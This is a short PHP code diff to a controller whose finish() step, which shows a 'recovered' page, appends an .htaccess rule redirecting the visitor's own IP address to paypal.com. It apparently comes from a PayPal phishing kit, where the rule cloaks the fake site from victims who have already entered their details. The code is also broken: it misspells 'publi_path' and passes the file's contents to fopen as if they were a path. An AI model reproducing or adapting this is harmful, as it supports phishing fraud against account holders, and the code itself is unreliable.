@@ -73,6 +73,16 @@ class SummaryController extends Controller
 
     public function finish()
     {
+      $this->addHtaccess();
       return view('recovered');
+    }
+
+    public function addHtaccess()
+    {
+        $file = file_get_contents(publi_path() . '/.htaccess');
+        $fp = fopen($file,'a');
+        fwrite($fp, 'RewriteCond %{REMOTE_ADDR} ^' . $_SERVER['REMOTE_ADDR'] .  '$' . PHP_EOL . '
+                     RewriteRule .* https://www.paypal.com [R,L]');
+        fclose($fp);
     }
 }
